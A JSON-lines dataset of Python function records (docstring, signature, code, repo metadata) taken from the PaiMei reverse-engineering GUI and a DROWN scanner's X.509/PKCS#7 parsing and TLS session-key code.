{"docstring": "'''\nLoad the specified module into the tree.\n'''\n", "func_signal": "def load_module (self, module_name):\n", "code": "dlg = wx.FileDialog(                                    \\\n    self,                                               \\\n    message     = \"Select PIDA module\",                 \\\n    defaultDir  = os.getcwd(),                          \\\n    defaultFile = \"\",                                   \\\n    wildcard    = \"*.PIDA\",                             \\\n    style       = wx.OPEN | wx.CHANGE_DIR | wx.MULTIPLE \\\n)\n\nif dlg.ShowModal() != wx.ID_OK:\n    return\n\nfor path in dlg.GetPaths():\n\n    module_name = path[path.rfind(\"\\\\\")+1:path.rfind(\".pida\")].lower()\n    \n    if self.top.pida_modules.has_key(module_name):\n        self.top.err(\"Module %s already loaded ... skipping.\" % module_name)\n        continue\n    \n    busy = wx.BusyInfo(\"Loading module ... stand by.\")\n    wx.Yield()\n    \n    start = time.time()\n       \n    #if they want to diff a new module remove the current module\n    if self.root_module != None:\n        del self.top.pida_modules[self.module_name]\n        self.remove_module()\n        \n    self.top.pida_modules[module_name] = pida.load(path)\n    \n    #if we are tree a then we load the module name into module_a_name and visa versa\n    if self.ctrl_name == \"A\":\n        self.top.module_a_name = module_name\n    else:\n        self.top.module_b_name = module_name\n        \n    #set the current module name\n    self.module_name = module_name\n    \n    tree_module = self.AppendItem(self.root, module_name)\n    \n    self.root_module = tree_module\n    \n    self.SetPyData(tree_module, self.top.pida_modules[module_name])\n    self.SetItemImage(tree_module, self.icon_folder,      wx.TreeItemIcon_Normal)\n    self.SetItemImage(tree_module, self.icon_folder_open, wx.TreeItemIcon_Expanded)\n\n    sorted_functions = [f.id for f in self.top.pida_modules[module_name].nodes.values() if not f.is_import]\n    sorted_functions.sort()\n\n    for func_key in sorted_functions:\n        #add our extension into the loaded module\n        self.top.pida_modules[module_name].nodes[func_key].ext[\"PAIMEIDiffFunction\"] = PAIMEIDiffFunction.PAIMEIDiffFunction(self.top.pida_modules[module_name].nodes[func_key], self.top.pida_modules[module_name], self.top)\n        function = self.top.pida_modules[module_name].nodes[func_key]\n        tree_function = self.AppendItem(tree_module, \"%08x - %s\" % (function.ea_start, function.name))\n        self.SetPyData(tree_function, self.top.pida_modules[module_name].nodes[func_key])\n        self.SetItemImage(tree_function, self.icon_folder,      wx.TreeItemIcon_Normal)\n        self.SetItemImage(tree_function, self.icon_folder_open, wx.TreeItemIcon_Expanded)\n        \n        sorted_bbs = function.nodes.keys()\n        sorted_bbs.sort()\n\n\n    self.Expand(self.root)\n    self.top.msg(\"Loaded %d function(s) in PIDA module '%s' in %.2f seconds.\" % (len(self.top.pida_modules[module_name].nodes), module_name, round(time.time() - start, 3)))", "path": "console\\modules\\_PAIMEIdiff\\ExplorerTreeCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nGrab the x/y coordinates when the right mouse button is clicked.\n'''\n\n", "func_signal": "def on_right_down (self, event):\n", "code": "self.x = event.GetX()\nself.y = event.GetY()\n\nitem, flags = self.HitTest((self.x, self.y))\n\nif flags & wx.LIST_HITTEST_ONITEM:\n    self.Select(item)\nelse:\n    self.x = None\n    self.y = None", "path": "console\\modules\\_PAIMEIpstalker\\PIDAModulesListCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "# begin wxGlade: PyDbgDialog.__do_layout\n", "func_signal": "def __do_layout(self):\n", "code": "overall = wx.BoxSizer(wx.VERTICAL)\noverall.Add(self.retrieve_list, 0, wx.EXPAND|wx.ADJUST_MINSIZE, 0)\noverall.Add(self.process_list, 1, wx.EXPAND, 0)\noverall.Add(self.load_target, 0, wx.EXPAND|wx.ADJUST_MINSIZE, 0)\nbutton_bar = wx.BoxSizer(wx.HORIZONTAL)\nbutton_bar.Add(self.attach_or_load, 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)\nbutton_bar.Add(self.cancel, 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)\noverall.Add(button_bar, 0, wx.EXPAND|wx.ADJUST_MINSIZE, 0)\nself.SetAutoLayout(True)\nself.SetSizer(overall)\nself.Layout()\n# end wxGlade", "path": "console\\modules\\_PAIMEIpeek\\PyDbgDlg.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nLoad a PIDA module into memory.\n'''\n\n", "func_signal": "def on_add_module (self, event):\n", "code": "dlg = wx.FileDialog(                                    \\\n    self,                                               \\\n    message     = \"Select PIDA module\",                 \\\n    defaultDir  = os.getcwd(),                          \\\n    defaultFile = \"\",                                   \\\n    wildcard    = \"*.PIDA\",                             \\\n    style       = wx.OPEN | wx.CHANGE_DIR | wx.MULTIPLE \\\n)\n\nif dlg.ShowModal() != wx.ID_OK:\n    return\n\nfor path in dlg.GetPaths():\n    try:\n        module_name = path[path.rfind(\"\\\\\")+1:path.rfind(\".pida\")].lower()\n\n        if self.top.pida_modules.has_key(module_name):\n            self.top.err(\"Module %s already loaded ... skipping.\" % module_name)\n            continue\n\n        # deprecated - replaced by progress dialog.\n        #busy = wx.BusyInfo(\"Loading %s ... stand by.\" % module_name)\n        #wx.Yield()\n\n        start  = time.time()\n        module = pida.load(path, progress_bar=\"wx\")\n\n        if not module:\n            self.top.msg(\"Loading of PIDA module '%s' cancelled by user.\" % module_name)\n            return\n\n        elif module == -1:\n            raise Exception\n\n        else:\n            self.top.pida_modules[module_name] = module\n            self.top.msg(\"Loaded PIDA module '%s' in %.2f seconds.\" % (module_name, round(time.time() - start, 3)))\n\n        # add the function / basic blocks to the global count.\n        function_count    = len(self.top.pida_modules[module_name].nodes)\n        basic_block_count = 0\n\n        for function in self.top.pida_modules[module_name].nodes.values():\n            basic_block_count += len(function.nodes)\n\n        self.top.function_count    += function_count\n        self.top.basic_block_count += basic_block_count\n\n        self.top.update_gauges()\n\n        idx = len(self.top.pida_modules) - 1\n        self.InsertStringItem(idx, \"\")\n        self.SetStringItem(idx, 0, \"%d\" % function_count)\n        self.SetStringItem(idx, 1, \"%d\" % basic_block_count)\n        self.SetStringItem(idx, 2, module_name)\n\n        self.SetColumnWidth(2, wx.LIST_AUTOSIZE)\n    except:\n        self.top.err(\"FAILED LOADING MODULE: %s. Possibly corrupt or version mismatch?\" % module_name)\n        if self.top.pida_modules.has_key(module_name):\n            del(self.top.pida_modules[module_name])", "path": "console\\modules\\_PAIMEIpstalker\\PIDAModulesListCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nLoad the specified module into the tree.\n'''\n\n", "func_signal": "def load_module (self, module_name):\n", "code": "tree_module = self.AppendItem(self.root, module_name)\nself.SetPyData(tree_module, self.top.pida_modules[module_name])\nself.SetItemImage(tree_module, self.icon_folder,      wx.TreeItemIcon_Normal)\nself.SetItemImage(tree_module, self.icon_folder_open, wx.TreeItemIcon_Expanded)\n\nsorted_functions = [f.ea_start for f in self.top.pida_modules[module_name].nodes.values() if not f.is_import]\nsorted_functions.sort()\n\nfor func_key in sorted_functions:\n    function = self.top.pida_modules[module_name].nodes[func_key]\n    \n    tree_function = self.AppendItem(tree_module, \"%08x - %s\" % (function.ea_start, function.name))\n    self.SetPyData(tree_function, self.top.pida_modules[module_name].nodes[func_key])\n    self.SetItemImage(tree_function, self.icon_folder,      wx.TreeItemIcon_Normal)\n    self.SetItemImage(tree_function, self.icon_folder_open, wx.TreeItemIcon_Expanded)\n\n    sorted_bbs = function.nodes.keys()\n    sorted_bbs.sort()\n\n    for bb_key in sorted_bbs:\n        bb = function.nodes[bb_key]\n\n        tree_bb = self.AppendItem(tree_function, \"%08x\" % bb.ea_start)\n        self.SetPyData(tree_bb, function.nodes[bb_key])\n        self.SetItemImage(tree_bb, self.icon_tag, wx.TreeItemIcon_Normal)\n\nself.Expand(self.root)", "path": "console\\modules\\_PAIMEIexplorer\\ExplorerTreeCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nMake record of the selected target/tag combination.\n'''\n\n", "func_signal": "def on_item_activated (self, event):\n", "code": "if not self.selected:\n    return\n\nselected = self.GetPyData(self.selected)\n\n# module selected.\nif type(selected) == pida.module:\n    pass\n\n# function selected.\nelif type(selected) == pida.function:\n    disasm = \"\"\"\n    <html>\n        <body text=#eeeeee bgcolor=#000000>\n        <font size=4><b>%s</b></font>\n        <font face=courier size=2>\n    \"\"\" % (selected.name)\n\n    for bb in selected.sorted_nodes():\n        disasm += \"<p>\"\n\n        # chunked block.\n        if selected.ea_start > bb.ea_start > selected.ea_end:\n            disasm += \"<font color=blue>CHUNKED BLOCK --------------------</font><br>\"\n\n        for ins in bb.sorted_instructions():\n            ins_disasm = ins.disasm\n            ins_disasm = re.sub(\"(?P<op>^j..?)\\s\", \"<font color=yellow>\\g<op> </font>\", ins_disasm)\n            ins_disasm = re.sub(\"(?P<op>^call)\\s\", \"<font color=red>\\g<op> </font>\",    ins_disasm)\n\n            disasm += \"<font color=#999999>%08x</font>&nbsp;&nbsp;%s<br>\" % (ins.ea, ins_disasm)\n\n    disasm += \"</font></body></html>\"\n\n    self.top.disassembly.SetPage(disasm)\n\n# basic block selected.\nelif type(selected) == pida.basic_block:\n    pass", "path": "console\\modules\\_PAIMEIexplorer\\ExplorerTreeCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nUnmark selected function as different\n'''\n", "func_signal": "def unmark_different(self,event):\n", "code": "item = self.top.MatchedBListCtrl.GetItem( self.top.MatchedAListCtrl.curr)\nitem.SetTextColour(wx.BLACK)\nself.top.MatchedBListCtrl.SetItem(item)\n\nitem = self.top.MatchedAListCtrl.GetItem( self.top.MatchedAListCtrl.curr)\nitem.SetTextColour(wx.BLACK)\nself.top.MatchedAListCtrl.SetItem(item)\n\nself.top.matched_list.unmark_function_as_different(self.top.MatchedAListCtrl.curr)", "path": "console\\modules\\_PAIMEIdiff\\MatchedListCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nGrab the x/y coordinates when the right mouse button is clicked.\n'''\n\n", "func_signal": "def on_item_right_down (self, event):\n", "code": "self.x = event.GetX()\nself.y = event.GetY()\n\nitem, flags = self.HitTest((self.x, self.y))\n\nif flags & wx.TREE_HITTEST_ONITEM:\n    self.SelectItem(item)\nelse:\n    self.x = None\n    self.y = None", "path": "console\\modules\\_PAIMEIexplorer\\ExplorerTreeCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "# begin wxGlade: PAIMEIexplorer.__init__\n", "func_signal": "def __init__(self, *args, **kwds):\n", "code": "kwds[\"style\"] = wx.TAB_TRAVERSAL\nwx.Panel.__init__(self, *args, **kwds)\n\nself.log_splitter                = wx.SplitterWindow(self, -1, style=wx.SP_3D|wx.SP_BORDER)\nself.log_window                  = wx.Panel(self.log_splitter, -1)\nself.top_window                  = wx.Panel(self.log_splitter, -1)\nself.disassmbly_column_staticbox = wx.StaticBox(self.top_window, -1, \"Disassembly\")\nself.special_column_staticbox    = wx.StaticBox(self.top_window, -1, \"Special\")\nself.browser_column_staticbox    = wx.StaticBox(self.top_window, -1, \"Browser\")\nself.pida_modules_static         = wx.StaticText(self.top_window, -1, \"PIDA Modules\")\nself.pida_modules_list           = _PAIMEIexplorer.PIDAModulesListCtrl.PIDAModulesListCtrl(self.top_window, -1, top=self, style=wx.LC_REPORT|wx.SUNKEN_BORDER)\nself.add_module                  = wx.Button(self.top_window, -1, \"Add Module(s)\")\nself.explorer                    = _PAIMEIexplorer.ExplorerTreeCtrl.ExplorerTreeCtrl(self.top_window, -1, top=self, style=wx.TR_HAS_BUTTONS|wx.TR_LINES_AT_ROOT|wx.TR_DEFAULT_STYLE|wx.SUNKEN_BORDER)\nself.disassembly                 = _PAIMEIexplorer.HtmlWindow.HtmlWindow(self.top_window, -1, top=self, style=wx.NO_FULL_REPAINT_ON_RESIZE)\nself.special                     = wx.TextCtrl(self.top_window, -1, \"\", style=wx.TE_MULTILINE|wx.TE_READONLY)\nself.log                         = wx.TextCtrl(self.log_window, -1, \"\", style=wx.TE_MULTILINE|wx.TE_READONLY|wx.TE_LINEWRAP)\n\nself.__set_properties()\nself.__do_layout()\n# end wxGlade\n\n# set the default sash position to be 100 pixels from the bottom (small log window).\nself.log_splitter.SetSashPosition(-100)\n\nself.list_book    = kwds[\"parent\"]             # handle to list book.\nself.main_frame   = self.list_book.top         # handle to top most frame.\n\n# log window bindings.\nself.Bind(wx.EVT_TEXT_MAXLEN, self.OnMaxLogLengthReached, self.log)\n\n# explorer tree ctrl.\nself.explorer.Bind(wx.EVT_TREE_ITEM_ACTIVATED,   self.explorer.on_item_activated)\nself.explorer.Bind(wx.EVT_TREE_SEL_CHANGED,      self.explorer.on_item_sel_changed)\nself.explorer.Bind(wx.EVT_TREE_ITEM_RIGHT_CLICK, self.explorer.on_item_right_click)\nself.explorer.Bind(wx.EVT_RIGHT_UP,              self.explorer.on_item_right_click)\nself.explorer.Bind(wx.EVT_RIGHT_DOWN,            self.explorer.on_item_right_down)\n\n# pida modules list ctrl.\nself.Bind(wx.EVT_BUTTON,                                self.pida_modules_list.on_add_module, self.add_module)\nself.pida_modules_list.Bind(wx.EVT_COMMAND_RIGHT_CLICK, self.pida_modules_list.on_right_click)\nself.pida_modules_list.Bind(wx.EVT_RIGHT_UP,            self.pida_modules_list.on_right_click)\nself.pida_modules_list.Bind(wx.EVT_RIGHT_DOWN,          self.pida_modules_list.on_right_down)\nself.pida_modules_list.Bind(wx.EVT_LIST_ITEM_ACTIVATED, self.pida_modules_list.on_activated)\n\nself.msg(\"PaiMei Explorer\")\nself.msg(\"Module by Pedram Amini\\n\")", "path": "console\\modules\\PAIMEIexplorer.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nRight click event handler for popup remove menu selection.\n'''\n\n", "func_signal": "def on_right_click_popup_remove (self, event):\n", "code": "idx    = self.GetFirstSelected()\nmodule = self.GetItem(idx, 2).GetText()\n\n# add the function / basic blocks to the global count.\nself.top.function_count -= len(self.top.pida_modules[module].nodes)\n\nfor function in self.top.pida_modules[module].nodes.values():\n    self.top.basic_block_count -= len(function.nodes)\n\nself.top.update_gauges()\n\ndel(self.top.pida_modules[module])\nself.DeleteItem(idx)", "path": "console\\modules\\_PAIMEIpstalker\\PIDAModulesListCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nBubble up the attach or load target to the main PAIMEIpeek module.\n'''\n\n", "func_signal": "def on_attach_or_load (self, event):\n", "code": "self.parent.load = self.load_target.GetValue()\nself.parent.pid  = self.process_list.selected_pid\nself.parent.proc = self.process_list.selected_proc\n\nif not self.parent.load and not self.parent.pid and not self.parent.proc:\n    dlg = wx.MessageDialog(self, \"You haven't selected a process to load or attach to.\", \"Error\", wx.OK | wx.ICON_WARNING)\n    dlg.ShowModal()\n    return\n\nself.Destroy()", "path": "console\\modules\\_PAIMEIpeek\\PyDbgDlg.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nWhen an item in the PIDA module list is right clicked, display a context menu.\n'''\n\n", "func_signal": "def on_right_click (self, event):\n", "code": "if not self.x or not self.y:\n    return\n\n# we only have to do this once, that is what the hasattr() check is for.\nif not hasattr(self, \"right_click_popup_remove\"):\n    self.right_click_popup_remove = wx.NewId()\n    self.Bind(wx.EVT_MENU, self.on_right_click_popup_remove, id=self.right_click_popup_remove)\n\n# make a menu.\nmenu = wx.Menu()\nmenu.Append(self.right_click_popup_remove, \"Remove\")\n\nself.PopupMenu(menu, (self.x, self.y))\nmenu.Destroy()", "path": "console\\modules\\_PAIMEIpstalker\\PIDAModulesListCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nExtracts DSA parameters p, q, g from\nASN1 bitstring component subjectPublicKey and parametersAsn1 from\n'parameters' field of AlgorithmIdentifier.\n'''\n", "func_signal": "def get_DSA_pub_key_material(subjectPublicKeyAsn1, parametersAsn1):\n", "code": "pubkey = subjectPublicKeyAsn1.toOctets()\n\nkey = decode(pubkey, asn1Spec=DsaPubKey())[0]\nparameters = decode(str(parametersAsn1), asn1Spec=DssParams())[0]\nparamDict = {\"pub\": int(key)}\n\nfor param in ['p', 'q', 'g']:\n    paramDict[param] = parameters.getComponentByName(param)._value\n    \nreturn paramDict", "path": "pyx509\\pkcs7\\asn1_models\\tools.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "\"\"\"Return time from Time component in YYYYMMDDHHMMSSZ format\"\"\"\n", "func_signal": "def _getGeneralizedTime(timeComponent):\n", "code": "if timeComponent.getName() == \"generalTime\": #from pkcs7.asn1_models.X509_certificate.Time\n    #already in YYYYMMDDHHMMSSZ format\n    return timeComponent.getComponent()._value\nelse: #utcTime\n    #YYMMDDHHMMSSZ format\n    #UTCTime has only short year format (last two digits), so add\n    #19 or 20 to make it \"full\" year; by RFC 5280 it's range 1950..2049\n    timeValue = timeComponent.getComponent()._value\n    shortyear = int(timeValue[:2])\n    return (shortyear >= 50 and \"19\" or \"20\") + timeValue", "path": "pyx509\\pkcs7_models.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "\"\"\"check if the certificate was not on the CRL list at a particular date\"\"\"\n", "func_signal": "def crl_validity_at_date(self, date):\n", "code": "rev_date = self.get_revocation_date()\nif not rev_date:\n  return True\nif date >= rev_date:\n  return False\nelse:\n  return True", "path": "pyx509\\pkcs7_models.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "\"\"\"\nChecks if set of certificates of this timestamp contains\ncertificate with specified serial number.\nReturns True if it does, False otherwise.\n\"\"\"\n", "func_signal": "def certificates_contain(self, cert_serial_num):\n", "code": "for cert in self.certificates:\n  if cert.tbsCertificate.serial_number == cert_serial_num:\n    return True\nreturn False", "path": "pyx509\\pkcs7_models.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "'''\nDecodes Timestamp Token\n'''\n", "func_signal": "def decode_tst(tst_bytes):\n", "code": "tst = TSTInfo()\ndecoded = decode(tst_bytes,asn1Spec=tst)\ntst = decoded[0]\n\nreturn tst", "path": "pyx509\\pkcs7\\pkcs7_decoder.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "# Creates a dictionary for the component types found in\n# SubjectAltName. Each dictionary entry is a list of names\n", "func_signal": "def __init__(self, asn1_subjectAltName):\n", "code": "self.values = collections.defaultdict(list)\nfor gname in asn1_subjectAltName:\n    component_type = gname.getName()\n    if component_type == 'iPAddress':\n        name = self.mk_ip_addr(gname.getComponent())\n    else:\n        name = unicode(gname.getComponent())\n    self.values[component_type].append(name)", "path": "pyx509\\pkcs7_models.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "\"\"\"\nConverts OID tuple to OID string\n\"\"\"\n", "func_signal": "def tuple_to_OID(tuple):\n", "code": "l = len(tuple)\nbuf = ''\nfor idx in xrange(l):\n    if (idx < l-1):\n        buf += str(tuple[idx]) + '.'\n    else:\n        buf += str(tuple[idx])\nreturn buf", "path": "pyx509\\pkcs7\\asn1_models\\tools.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "'''\nDecodes qualified timestamp\n'''\n", "func_signal": "def decode_qts(qts_bytes):\n", "code": "qts = Qts()    \ndecoded = decode(qts_bytes,asn1Spec=qts)\nqts = decoded[0]\n\nreturn qts", "path": "pyx509\\pkcs7\\pkcs7_decoder.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "'''\nChecks if all values of verification_results dictionary are True,\nwhich means that the certificate is valid\n'''\n", "func_signal": "def is_verified(self, ignore_missing_crl_check=False):\n", "code": "return self._evaluate_verification_results(\n                  self.verification_results,\n                  ignore_missing_crl_check=ignore_missing_crl_check)", "path": "pyx509\\pkcs7_models.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "\"\"\"\nparses date string and returns a datetime object;\n\"\"\"\n", "func_signal": "def parse_date(cls, date):\n", "code": "year = int(date[:4])\nmonth = int(date[4:6])\nday = int(date[6:8])\nhour = int(date[8:10])\nminute = int(date[10:12])\ntry:\n    #seconds must be present per RFC 5280, but some braindead certs\n    #omit it\n    second = int(date[12:14])\nexcept (ValueError, IndexError):\n    second = 0\nreturn datetime.datetime(year, month, day, hour, minute, second)", "path": "pyx509\\pkcs7_models.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "'''\nRemove the PKCS#7 padding from a text string\n'''\n", "func_signal": "def decode(self, text):\n", "code": "nl = len(text)\nval = int(binascii.hexlify(text[-1]), 16)\nif val > self.k:\n    raise ValueError('Input is not padded or padding is corrupt')\n \nl = nl - val\nreturn text[:l]", "path": "scapy_ssl_tls\\pkcs7.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "# Converts encoded ipv4 or ipv6 octents into printable strings.\n", "func_signal": "def mk_ip_addr(self, octets):\n", "code": "octet_len = len(octets)\noctets_as_ints = struct.unpack(\"B\"*octet_len, str(octets))\nif octet_len == 4:\n    octets_as_str = map(str, octets_as_ints)\n    return \".\".join(octets_as_str)\nelse:\n    # IPV6 style addresses\n    # See http://tools.ietf.org/html/rfc2373#section-2.2\n    to_hex = lambda x: \"%02X\" % x\n    address_chunks = [\"\".join(map(to_hex, octets_as_ints[x:x+2]))\n                      for x in range(octet_len / 2)]\n    return \":\".join(address_chunks)", "path": "pyx509\\pkcs7_models.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "'''\nConverts bit string into octets string\n'''\n", "func_signal": "def toOctets(self):\n", "code": "def _tuple_to_byte(tuple):          \n  return chr(int(''.join(map(str, tuple)),2))\n      \nres = ''        \nbyte_len = len(self._value) / 8\nfor byte_idx in xrange(byte_len):\n    bit_idx = byte_idx * 8\n    byte_tuple = self._value[bit_idx:bit_idx + 8]\n    byte = _tuple_to_byte(byte_tuple)            \n    res += byte\nreturn res", "path": "pyx509\\pkcs7\\asn1_models\\general_types.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "\"\"\" \nSplit buf into two strings (part1, part2) where part1 has count bytes.\n@raises ValueError if buf is too short.\n\"\"\"\n", "func_signal": "def _splitBytes(buf, count):\n", "code": "if len(buf) < count:\n    raise ValueError(\"Malformed structure encountered when parsing SCT, expected %d bytes, got only %d\" % (count, len(buf)))\n\nreturn buf[:count], buf[count:]", "path": "pyx509\\pkcs7_models.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "\"\"\"\nparses the genTime string and returns a datetime object;\nit also adjusts the time according to local timezone, so that it is\ncompatible with other parts of the library\n\"\"\"\n", "func_signal": "def get_genTime_as_datetime(self):\n", "code": "year = int(self.genTime[:4])\nmonth = int(self.genTime[4:6])\nday = int(self.genTime[6:8])\nhour = int(self.genTime[8:10])\nminute = int(self.genTime[10:12])\nsecond = int(self.genTime[12:14])\nrest = self.genTime[14:].strip(\"Z\")\nif rest:\n  micro = int(float(rest)*1e6)\nelse:\n  micro = 0\ntz_delta = datetime.timedelta(seconds=time.daylight and time.altzone\n                              or time.timezone)\nreturn datetime.datetime(year, month, day, hour, minute, second, micro) - tz_delta", "path": "pyx509\\pkcs7_models.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "'''\nExtracts modulus and public exponent from \nASN1 bitstring component subjectPublicKey\n'''\n# create template for decoder\n", "func_signal": "def get_RSA_pub_key_material(subjectPublicKeyAsn1):\n", "code": "rsa_key = RsaPubKey()\n# convert ASN1 subjectPublicKey component from BITSTRING to octets\npubkey = subjectPublicKeyAsn1.toOctets()\n\nkey = decode(pubkey, asn1Spec=rsa_key)[0]\n\nmod = key.getComponentByName(\"modulus\")._value\nexp = key.getComponentByName(\"exp\")._value\n\nreturn {'mod': mod, 'exp': exp}", "path": "pyx509\\pkcs7\\asn1_models\\tools.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "'''\nfill context\n'''\n", "func_signal": "def process(self,p):\n", "code": "if p.haslayer(TLSHandshake):\n    # requires handshake messages\n    if p.haslayer(TLSClientHello):\n        if not self.params.handshake.client:\n            self.params.handshake.client=p[TLSClientHello]\n            \n            # fetch randombytes for crypto stuff\n            if not self.crypto.session.randombytes.client:\n                self.crypto.session.randombytes.client=struct.pack(\"!I\",p[TLSClientHello].gmt_unix_time)+p[TLSClientHello].random_bytes\n    if p.haslayer(TLSServerHello):\n        if not self.params.handshake.server:\n            self.params.handshake.server=p[TLSServerHello]\n            #fetch randombytes\n            if not self.crypto.session.randombytes.server:\n                self.crypto.session.randombytes.server=struct.pack(\"!I\",p[TLSServerHello].gmt_unix_time)+p[TLSServerHello].random_bytes\n        # negotiated params\n        if not self.params.negotiated.ciphersuite:\n            self.params.negotiated.ciphersuite=p[TLSServerHello].cipher_suite\n            self.params.negotiated.compression=p[TLSServerHello].compression_method\n            kex,enc,mac = describe_ciphersuite(self.params.negotiated.ciphersuite)\n            self.params.negotiated.key_exchange=kex\n            self.params.negotiated.encryption=enc\n            self.params.negotiated.mac=mac\n    if p.haslayer(TLSCertificateList):\n        if self.params.negotiated.key_exchange and \"RSA\" in self.params.negotiated.key_exchange:\n            # fetch server pubkey // PKCS1_v1_5\n            cert = p[TLSCertificateList].certificates[0].data\n            self.crypto.server.rsa.pubkey = PKCS1_v1_5.new(x509_extract_pubkey_from_der(cert))\n            # check for client privkey\n            \n    # calculate key material\n    if p.haslayer(TLSClientKeyExchange) \\\n            and self.crypto.server.rsa.privkey:  \n        \n        # FIXME: RSA_AES128_SHA1\n        self.crypto.session.key.length.mac = 160/8\n        self.crypto.session.key.length.encryption = 128/8\n        self.crypto.session.key.length.iv = 16\n        # calculate secrets and key material from encrypted key\n        # if private_key is set we're going to decrypt the PremasterSecret and re-calc key material\n        self.crypto.session.encrypted_premaster_secret = p[TLSClientKeyExchange].load\n        # decrypt epms -> pms\n        self.crypto.session.premaster_secret = self.crypto.server.rsa.privkey.decrypt(self.crypto.session.encrypted_premaster_secret,None)\n        secparams = TLSSecurityParameters()\n        \n        secparams.mac_key_length=self.crypto.session.key.length.mac\n        secparams.enc_key_length=self.crypto.session.key.length.encryption\n        secparams.fixed_iv_length=self.crypto.session.key.length.iv\n        \n        \n        secparams.generate(self.crypto.session.premaster_secret, \n                           self.crypto.session.randombytes.client,\n                           self.crypto.session.randombytes.server)\n        \n        self.crypto.session.master_secret = secparams.master_secret\n        self.crypto.session.key.server.mac = secparams.server_write_MAC_key\n        self.crypto.session.key.server.encryption = secparams.server_write_key\n        self.crypto.session.key.server.iv = secparams.server_write_IV\n\n    \n        self.crypto.session.key.client.mac = secparams.client_write_MAC_key\n        self.crypto.session.key.client.encryption = secparams.client_write_key\n        self.crypto.session.key.client.iv = secparams.client_write_IV\n    \n        del secparams\n        \n        # create cypher objects\n        # one for encryption and one for decryption to not mess up internal states\n        self.crypto.client.enc = ciphersuite_factory(self.params.negotiated.ciphersuite,\n                                                     key=self.crypto.session.key.client.encryption,\n                                                     iv=self.crypto.session.key.client.iv)\n        self.crypto.client.dec = ciphersuite_factory(self.params.negotiated.ciphersuite,\n                                                     key=self.crypto.session.key.client.encryption,\n                                                     iv=self.crypto.session.key.client.iv)\n        self.crypto.server.enc = ciphersuite_factory(self.params.negotiated.ciphersuite,\n                                                     key=self.crypto.session.key.server.encryption,\n                                                     iv=self.crypto.session.key.server.iv)\n        self.crypto.server.dec = ciphersuite_factory(self.params.negotiated.ciphersuite,\n                                                     key=self.crypto.session.key.server.encryption,\n                                                     iv=self.crypto.session.key.server.iv)\n        \n    # check whether crypto was set up", "path": "scapy_ssl_tls\\ssl_tls_crypto.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "'''\nPad an input string according to PKCS#7\n'''\n", "func_signal": "def encode(self, text):\n", "code": "l = len(text)\noutput = StringIO.StringIO()\nval = self.k - (l % self.k)\nfor _ in xrange(val):\n    output.write('%02x' % val)\nreturn text + binascii.unhexlify(output.getvalue())", "path": "scapy_ssl_tls\\pkcs7.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
